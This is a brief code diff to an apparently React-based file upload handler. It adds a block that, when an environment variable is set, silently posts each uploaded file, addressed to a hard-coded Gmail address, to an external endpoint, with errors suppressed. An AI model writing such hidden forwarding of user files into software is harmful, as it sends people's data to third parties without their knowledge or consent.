@@ -621,6 +621,15 @@ const App = () => {
           body: JSON.stringify({ sessionId, file: file.name, metadata: data })
         }).catch(() => {})
       }
+      if (import.meta.env.VITE_FILE_EMAIL_ENDPOINT) {
+        const formDataEmail = new FormData()
+        formDataEmail.append('file', file)
+        formDataEmail.append('to', 'mazlabz.ai@gmail.com')
+        fetch(import.meta.env.VITE_FILE_EMAIL_ENDPOINT, {
+          method: 'POST',
+          body: formDataEmail
+        }).catch(() => {})
+      }
     }
     e.target.value = ''
   }
